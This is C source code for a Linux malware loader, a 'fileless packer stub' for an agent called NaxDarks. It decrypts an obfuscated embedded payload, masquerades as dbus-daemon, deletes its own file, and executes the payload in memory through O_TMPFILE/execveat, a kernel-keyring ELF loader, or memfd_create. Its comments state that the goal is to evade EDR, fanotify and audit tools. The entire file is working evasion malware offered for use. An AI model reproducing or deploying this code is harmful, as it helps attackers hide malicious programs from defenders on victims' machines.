/*
 * stub.c — Fileless packer stub for NaxDarks agent
 *
 * Execution techniques (in order of preference):
 *   1. O_TMPFILE + execveat(AT_EMPTY_PATH) — no memfd, no named file, evades fanotify
 *   2. Kernel keyring (big_key) + userland exec — no fd, no inode, no VFS
 *   3. memfd_create fallback — for older kernels without O_TMPFILE/keyring
 */
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <elf.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <limits.h>
#include <errno.h>
#include "stub_payload.h"

#ifndef STUB_KEY_LEN
#define STUB_KEY_LEN  32
#endif
#ifndef STUB_SALT_LEN
#define STUB_SALT_LEN 16
#endif
#ifndef STUB_PASS_LEN
#define STUB_PASS_LEN 32
#endif

#ifndef KEY_SPEC_SESSION_KEYRING
#define KEY_SPEC_SESSION_KEYRING (-3)
#endif
#define KEYCTL_READ    11
#define KEYCTL_REVOKE   3

#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif

#define PAGE_SZ    4096UL
#define PAGE_DN(x) ((x) & ~(PAGE_SZ - 1))
#define PAGE_UP(x) (((x) + PAGE_SZ - 1) & ~(PAGE_SZ - 1))

extern char **environ;

/* Direct syscalls */
static int sc_open(const char *p, int f, int m) { return (int)syscall(SYS_openat, AT_FDCWD, p, f, m); }
static ssize_t sc_write(int fd, const void *b, size_t n) { return (ssize_t)syscall(SYS_write, fd, b, n); }
static int sc_close(int fd) { return (int)syscall(SYS_close, fd); }
static int sc_unlink(const char *p) { return (int)syscall(SYS_unlinkat, AT_FDCWD, p, 0); }
static int sc_execveat(int fd, const char *p, char *const av[], char *const ev[], int fl) {
    return (int)syscall(SYS_execveat, fd, p, av, ev, fl);
}

/* Passphrase reconstruction  */
static void reconstruct_pass(unsigned char *pass) {
    memcpy(pass +  0, stub_pass_frag1, 8);
    memcpy(pass +  8, stub_pass_frag3, 8);
    memcpy(pass + 16, stub_pass_frag0, 8);
    memcpy(pass + 24, stub_pass_frag2, 8);
    for (int i = 0; i < STUB_PASS_LEN; i++)
        pass[i] ^= (unsigned char)(0x37 + i * 13);
}

/* KDF (FNV-1a 64 + xorshift64) */
static void derive_key(unsigned char *key, size_t key_len,
                       const unsigned char *pass, size_t pass_len,
                       const unsigned char *salt, size_t salt_len) {
    unsigned long long state = 0xCBF29CE484222325ULL;
    for (size_t i = 0; i < pass_len; i++) { state ^= pass[i]; state *= 0x100000001B3ULL; }
    for (size_t i = 0; i < salt_len; i++) { state ^= salt[i]; state *= 0x100000001B3ULL; }
    for (size_t i = 0; i < key_len; i++) {
        state ^= state << 13; state ^= state >> 7; state ^= state << 17;
        key[i] = (unsigned char)(state & 0xFF);
    }
}

/* Write all bytes to fd */
static int write_all(int fd, const void *buf, size_t len) {
    const unsigned char *p = buf;
    while (len > 0) {
        ssize_t n = sc_write(fd, p, len);
        if (n <= 0) return -1;
        p += n; len -= n;
    }
    return 0;
}

/* Camouflage setup */
static void setup_camo(char *s_comm, char *s_dbus, char *s_arg1, char *s_arg2,
                       char *s_arg3, char *s_arg4, char *s_arg5, char *s_arg6) {
    volatile char *p;

    p = (volatile char *)s_comm;
    p[0]='d';p[1]='b';p[2]='u';p[3]='s';p[4]='-';
    p[5]='d';p[6]='a';p[7]='e';p[8]='m';p[9]='o';p[10]='n';

    p = (volatile char *)s_dbus;
    p[0]='/';p[1]='u';p[2]='s';p[3]='r';p[4]='/';p[5]='b';p[6]='i';p[7]='n';p[8]='/';
    p[9]='d';p[10]='b';p[11]='u';p[12]='s';p[13]='-';p[14]='d';p[15]='a';p[16]='e';
    p[17]='m';p[18]='o';p[19]='n';

    p = (volatile char *)s_arg1;
    p[0]='-';p[1]='-';p[2]='s';p[3]='y';p[4]='s';p[5]='t';p[6]='e';p[7]='m';

    p = (volatile char *)s_arg2;
    p[0]='-';p[1]='-';p[2]='a';p[3]='d';p[4]='d';p[5]='r';p[6]='e';p[7]='s';p[8]='s';
    p[9]='=';p[10]='s';p[11]='y';p[12]='s';p[13]='t';p[14]='e';p[15]='m';p[16]='d';p[17]=':';

    p = (volatile char *)s_arg3;
    p[0]='-';p[1]='-';p[2]='n';p[3]='o';p[4]='f';p[5]='o';p[6]='r';p[7]='k';

    p = (volatile char *)s_arg4;
    p[0]='-';p[1]='-';p[2]='n';p[3]='o';p[4]='p';p[5]='i';p[6]='d';p[7]='f';
    p[8]='i';p[9]='l';p[10]='e';

    p = (volatile char *)s_arg5;
    p[0]='-';p[1]='-';p[2]='s';p[3]='y';p[4]='s';p[5]='t';p[6]='e';p[7]='m';p[8]='d';
    p[9]='-';p[10]='a';p[11]='c';p[12]='t';p[13]='i';p[14]='v';p[15]='a';p[16]='t';
    p[17]='i';p[18]='o';p[19]='n';

    p = (volatile char *)s_arg6;
    p[0]='-';p[1]='-';p[2]='s';p[3]='y';p[4]='s';p[5]='l';p[6]='o';p[7]='g';
    p[8]='-';p[9]='o';p[10]='n';p[11]='l';p[12]='y';
}

/* Self-delete + NAX_STUB_PATH */
static void self_delete(char **argv) {
    char stub_path[4096];
    if (realpath(argv[0], stub_path) == NULL) {
        strncpy(stub_path, argv[0], sizeof(stub_path) - 1);
        stub_path[sizeof(stub_path) - 1] = '\0';
    }
    setenv("NAX_STUB_PATH", stub_path, 1);

    /* Also try to unlink now */
    char self_exe[PATH_MAX] = {0};
    ssize_t n = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (n > 0) sc_unlink(self_exe);
}

/* TECHNIQUE 1: O_TMPFILE + execveat(AT_EMPTY_PATH)
 * - No memfd_create (monitored by EDR)
 * - No directory entry → no IN_CREATE / FAN_CREATE events
 * - Process shows as /tmp/#N (deleted) — looks like a normal temp file
 */
static int exec_otmpfile(const unsigned char *elf, size_t elf_len,
                         char *const argv[], char *const envp[]) {

    char s_tmp[8] = {0}, s_var[12] = {0}, s_run[8] = {0};
    { volatile char *p = (volatile char *)s_tmp;
      p[0]='/';p[1]='t';p[2]='m';p[3]='p'; }
    { volatile char *p = (volatile char *)s_var;
      p[0]='/';p[1]='v';p[2]='a';p[3]='r';p[4]='/';p[5]='t';p[6]='m';p[7]='p'; }
    { volatile char *p = (volatile char *)s_run;
      p[0]='/';p[1]='r';p[2]='u';p[3]='n'; }

    const char *dirs[] = { s_tmp, s_var, s_run, NULL };
    int fd = -1;
    for (int i = 0; dirs[i] && fd < 0; i++)
        fd = sc_open(dirs[i], O_TMPFILE | O_RDWR | O_CLOEXEC, 0700);

    if (fd < 0) return -1;


    if (write_all(fd, elf, elf_len) < 0) { sc_close(fd); return -1; }

    char fdpath[64] = {0};
    { volatile char *p = (volatile char *)fdpath;
      p[0]='/';p[1]='p';p[2]='r';p[3]='o';p[4]='c';p[5]='/';
      p[6]='s';p[7]='e';p[8]='l';p[9]='f';p[10]='/';
      p[11]='f';p[12]='d';p[13]='/'; }
    int n = 14;
    if (fd >= 100) fdpath[n++] = (char)('0' + (fd / 100) % 10);
    if (fd >=  10) fdpath[n++] = (char)('0' + (fd /  10) % 10);
    fdpath[n++] = (char)('0' + (fd % 10));
    fdpath[n] = '\0';

    int ro_fd = sc_open(fdpath, O_RDONLY | O_CLOEXEC, 0);
    if (ro_fd < 0) { sc_close(fd); return -1; }
    sc_close(fd);

    /* Execute with AT_EMPTY_PATH — no path string, harder to intercept */
    sc_execveat(ro_fd, "", argv, envp, AT_EMPTY_PATH);

    /* If execveat failed, try classic execve as fallback */
    fdpath[0] = '\0';
    { volatile char *p = (volatile char *)fdpath;
      p[0]='/';p[1]='p';p[2]='r';p[3]='o';p[4]='c';p[5]='/';
      p[6]='s';p[7]='e';p[8]='l';p[9]='f';p[10]='/';
      p[11]='f';p[12]='d';p[13]='/'; }
    n = 14;
    if (ro_fd >= 100) fdpath[n++] = (char)('0' + (ro_fd / 100) % 10);
    if (ro_fd >=  10) fdpath[n++] = (char)('0' + (ro_fd /  10) % 10);
    fdpath[n++] = (char)('0' + (ro_fd % 10));
    fdpath[n] = '\0';

    execve(fdpath, argv, envp);
    sc_close(ro_fd);
    return -1;
}

/* TECHNIQUE 2: Kernel keyring (big_key) + userland exec
 * - No fd, no inode, no VFS involvement
 * - Payload stored in kernel slab/encrypted tmpfs
 * - Execution via direct PT_LOAD mapping + jump — no execve at all
 * - Invisible to fanotify and most audit frameworks
 */
#ifdef __x86_64__
static __attribute__((noreturn)) void enter_elf(uintptr_t entry, uintptr_t sp) {
    register uintptr_t r_entry __asm__("rdi") = entry;
    register uintptr_t r_sp    __asm__("rsi") = sp;
    __asm__ volatile(
        "mov  %%rsi, %%rsp\n\t"
        "xor  %%eax, %%eax\n\t" "xor  %%ebx, %%ebx\n\t"
        "xor  %%ecx, %%ecx\n\t" "xor  %%edx, %%edx\n\t"
        "xor  %%esi, %%esi\n\t" "xor  %%ebp, %%ebp\n\t"
        "xor  %%r8d, %%r8d\n\t" "xor  %%r9d, %%r9d\n\t"
        "xor  %%r10d, %%r10d\n\t" "xor  %%r11d, %%r11d\n\t"
        "xor  %%r12d, %%r12d\n\t" "xor  %%r13d, %%r13d\n\t"
        "xor  %%r14d, %%r14d\n\t" "xor  %%r15d, %%r15d\n\t"
        "jmp  *%%rdi"
        : : "r"(r_entry), "r"(r_sp) : "memory"
    );
    __builtin_unreachable();
}
#elif defined(__aarch64__)
static __attribute__((noreturn)) void enter_elf(uintptr_t entry, uintptr_t sp) {
    __asm__ volatile(
        "mov  sp, %[sp]\n\t"
        "mov  x1, xzr\n\t" "mov  x2, xzr\n\t" "mov  x3, xzr\n\t"
        "mov  x4, xzr\n\t" "mov  x5, xzr\n\t" "mov  x6, xzr\n\t"
        "mov  x7, xzr\n\t" "mov  x8, xzr\n\t" "mov  x9, xzr\n\t"
        "mov  x10, xzr\n\t" "mov  x11, xzr\n\t" "mov  x12, xzr\n\t"
        "mov  x13, xzr\n\t" "mov  x14, xzr\n\t" "mov  x15, xzr\n\t"
        "mov  x16, xzr\n\t" "mov  x17, xzr\n\t" "mov  x18, xzr\n\t"
        "mov  x29, xzr\n\t" "mov  x30, xzr\n\t"
        "br   %[entry]"
        : : [entry] "r"(entry), [sp] "r"(sp) : "memory"
    );
    __builtin_unreachable();
}
#endif

static uintptr_t build_stack(void *stk_top, int argc, char **argv, char **envp,
                              uintptr_t entry, uintptr_t phdr_va,
                              uint16_t phnum, uint16_t phentsz) {
    int envc = 0;
    while (envp[envc]) envc++;

    uintptr_t sp = (uintptr_t)stk_top;
    char *new_argv[256], *new_envp[1024];

    for (int i = argc - 1; i >= 0; i--) {
        size_t l = strlen(argv[i]) + 1;
        sp -= l; memcpy((void *)sp, argv[i], l);
        new_argv[i] = (char *)sp;
    }
    for (int i = envc - 1; i >= 0; i--) {
        size_t l = strlen(envp[i]) + 1;
        sp -= l; memcpy((void *)sp, envp[i], l);
        new_envp[i] = (char *)sp;
    }

    sp &= ~15UL;
    sp -= 16;
    uintptr_t at_random = sp;
    { int rfd = open("/dev/urandom", O_RDONLY);
      if (rfd >= 0) { read(rfd, (void *)sp, 16); close(rfd); } }

    sp &= ~15UL;
    if ((17 + argc + envc) % 2 != 0) sp -= 8;

#define AUX(t, v) do { sp -= 8; *(uintptr_t *)sp = (uintptr_t)(v); \
                       sp -= 8; *(uintptr_t *)sp = (uintptr_t)(t); } while(0)
    AUX(AT_NULL, 0);
    AUX(AT_RANDOM, at_random);
    AUX(AT_PAGESZ, PAGE_SZ);
    AUX(AT_ENTRY, entry);
    AUX(AT_PHENT, phentsz);
    AUX(AT_PHNUM, phnum);
    AUX(AT_PHDR, phdr_va);
#undef AUX

    sp -= 8; *(uintptr_t *)sp = 0;
    for (int i = envc - 1; i >= 0; i--) { sp -= 8; *(uintptr_t *)sp = (uintptr_t)new_envp[i]; }
    sp -= 8; *(uintptr_t *)sp = 0;
    for (int i = argc - 1; i >= 0; i--) { sp -= 8; *(uintptr_t *)sp = (uintptr_t)new_argv[i]; }
    sp -= 8; *(uintptr_t *)sp = (uintptr_t)argc;

    return sp;
}

static int exec_keyring(const unsigned char *elf, size_t elf_len,
                        char *const argv[], char *const envp[]) {
    /* Store ELF in kernel keyring (big_key for payloads > 20KB) */
    long key;
    if (elf_len > 1048576) return -1; /* big_key max is 1 MiB */

    key = syscall(248, "big_key", "", elf, (long)elf_len,
                  (long)KEY_SPEC_SESSION_KEYRING);
    if (key < 0) {
        /* Fallback to user key if big_key not available */
        if (elf_len > 20000) return -1;
        key = syscall(248, "user", "", elf, (long)elf_len,
                      (long)KEY_SPEC_SESSION_KEYRING);
        if (key < 0) return -1;
    }

    /* Read back from kernel memory */
    long sz = syscall(250, (long)KEYCTL_READ, key, 0L, 0L);
    if (sz < 0) return -1;

    unsigned char *kbuf = mmap(NULL, (size_t)sz, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (kbuf == MAP_FAILED) return -1;

    if (syscall(250, (long)KEYCTL_READ, key, (long)kbuf, sz) < 0) {
        munmap(kbuf, sz); return -1;
    }

    /* Revoke key — payload is now only in our mapping */
    syscall(250, (long)KEYCTL_REVOKE, key, 0L, 0L);

    /* Validate ELF */
    if ((size_t)sz < sizeof(Elf64_Ehdr)) { munmap(kbuf, sz); return -1; }
    Elf64_Ehdr *eh = (Elf64_Ehdr *)kbuf;
    if (memcmp(eh->e_ident, ELFMAG, 4) != 0) { munmap(kbuf, sz); return -1; }
    if (eh->e_ident[EI_CLASS] != ELFCLASS64) { munmap(kbuf, sz); return -1; }

    int is_pie = (eh->e_type == ET_DYN);
    uintptr_t load_bias = 0;
    Elf64_Phdr *ph = (Elf64_Phdr *)(kbuf + eh->e_phoff);

    /* Calculate load bias for PIE */
    if (is_pie) {
        uintptr_t lo = UINTPTR_MAX, hi = 0;
        for (int i = 0; i < eh->e_phnum; i++) {
            if (ph[i].p_type != PT_LOAD) continue;
            if (ph[i].p_vaddr < lo) lo = ph[i].p_vaddr;
            uintptr_t end = ph[i].p_vaddr + ph[i].p_memsz;
            if (end > hi) hi = end;
        }
        size_t total = PAGE_UP(hi) - PAGE_DN(lo);
        void *hint = mmap(NULL, total, PROT_NONE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (hint == MAP_FAILED) { munmap(kbuf, sz); return -1; }
        munmap(hint, total);
        load_bias = (uintptr_t)hint - PAGE_DN(lo);
    }

    /* Map PT_LOAD segments */
    for (int i = 0; i < eh->e_phnum; i++) {
        if (ph[i].p_type != PT_LOAD) continue;

        int prot = 0;
        if (ph[i].p_flags & PF_R) prot |= PROT_READ;
        if (ph[i].p_flags & PF_W) prot |= PROT_WRITE;
        if (ph[i].p_flags & PF_X) prot |= PROT_EXEC;

        uintptr_t seg_va  = PAGE_DN(ph[i].p_vaddr + load_bias);
        size_t    seg_len = PAGE_UP(ph[i].p_vaddr + load_bias + ph[i].p_memsz) - seg_va;

        void *seg = mmap((void *)seg_va, seg_len, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
        if (seg == MAP_FAILED || seg != (void *)seg_va) { munmap(kbuf, sz); return -1; }

        uintptr_t dst = ph[i].p_vaddr + load_bias;
        if (ph[i].p_offset + ph[i].p_filesz > (size_t)sz) { munmap(kbuf, sz); return -1; }
        memcpy((void *)dst, kbuf + ph[i].p_offset, ph[i].p_filesz);

        if (ph[i].p_memsz > ph[i].p_filesz)
            memset((void *)(dst + ph[i].p_filesz), 0, ph[i].p_memsz - ph[i].p_filesz);

        mprotect((void *)seg_va, seg_len, prot);
    }

    /* Find PT_PHDR */
    uintptr_t phdr_va = 0;
    for (int i = 0; i < eh->e_phnum; i++) {
        if (ph[i].p_type == PT_PHDR) { phdr_va = ph[i].p_vaddr + load_bias; break; }
    }

    uintptr_t entry = eh->e_entry + load_bias;
    uint16_t phnum = eh->e_phnum;
    uint16_t phentsz = eh->e_phentsize;

    /* Done with the kernel buffer */
    munmap(kbuf, sz);

    /* Build stack and jump — no execve, no VFS */
    size_t stk_sz = 8 * 1024 * 1024;
    void *stk = mmap(NULL, stk_sz, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (stk == MAP_FAILED) return -1;

    /* Count argv */
    int argc = 0;
    while (argv[argc]) argc++;

    uintptr_t sp = build_stack((unsigned char *)stk + stk_sz, argc,
                               (char **)argv, (char **)envp,
                               entry, phdr_va, phnum, phentsz);
    enter_elf(entry, sp);
    /* never returns */
    return -1;
}

/* TECHNIQUE 3: memfd_create fallback (original stub method) */
static int exec_memfd(const unsigned char *elf, size_t elf_len,
                      char *const argv[], char *const envp[]) {
    int fd = (int)syscall(SYS_memfd_create, "", 0);
    if (fd < 0) return -1;

    if (write_all(fd, elf, elf_len) < 0) { sc_close(fd); return -1; }

    char fdpath[64] = {0};
    { volatile char *p = (volatile char *)fdpath;
      p[0]='/';p[1]='p';p[2]='r';p[3]='o';p[4]='c';p[5]='/';
      p[6]='s';p[7]='e';p[8]='l';p[9]='f';p[10]='/';
      p[11]='f';p[12]='d';p[13]='/'; }
    int n = 14;
    if (fd >= 100) fdpath[n++] = (char)('0' + (fd / 100) % 10);
    if (fd >=  10) fdpath[n++] = (char)('0' + (fd /  10) % 10);
    fdpath[n++] = (char)('0' + (fd % 10));
    fdpath[n] = '\0';

    execve(fdpath, (char **)argv, (char **)envp);
    sc_close(fd);
    return -1;
}

int main(int argc, char **argv, char **envp) {
    /* 1. Reconstruct passphrase + derive key */
    unsigned char pass[STUB_PASS_LEN];
    unsigned char key[STUB_KEY_LEN];
    reconstruct_pass(pass);
    derive_key(key, STUB_KEY_LEN, pass, STUB_PASS_LEN, stub_salt, STUB_SALT_LEN);
    memset(pass, 0, sizeof(pass));

    /* 2. Decrypt payload */
    unsigned char *buf = (unsigned char *)malloc(stub_payload_len);
    if (!buf) { memset(key, 0, sizeof(key)); return 1; }
    for (unsigned int i = 0; i < stub_payload_len; i++)
        buf[i] = stub_payload[i] ^ key[i % STUB_KEY_LEN];
    memset(key, 0, sizeof(key));

    /* 3. Camouflage */
    char s_comm[16]={0}, s_dbus[32]={0}, s_arg1[16]={0}, s_arg2[32]={0};
    char s_arg3[16]={0}, s_arg4[16]={0}, s_arg5[32]={0}, s_arg6[16]={0};
    setup_camo(s_comm, s_dbus, s_arg1, s_arg2, s_arg3, s_arg4, s_arg5, s_arg6);

    char *fake_argv[] = { s_dbus, s_arg1, s_arg2, s_arg3, s_arg4, s_arg5, s_arg6, NULL };

    prctl(PR_SET_NAME, s_comm, 0, 0, 0);
    setsid();
    self_delete(argv);

    /* 4. Execute  try techniques in order of evasion */

    /* Technique 1: O_TMPFILE + execveat (most evasive with execve) */
    exec_otmpfile(buf, stub_payload_len, fake_argv, envp);

    /* Technique 2: Kernel keyring + userland exec (no execve at all) */
    exec_keyring(buf, stub_payload_len, fake_argv, envp);

    /* Technique 3: memfd_create fallback (last resort) */
    exec_memfd(buf, stub_payload_len, fake_argv, envp);

    /* All techniques failed */
    memset(buf, 0, stub_payload_len);
    free(buf);
    return 1;
}
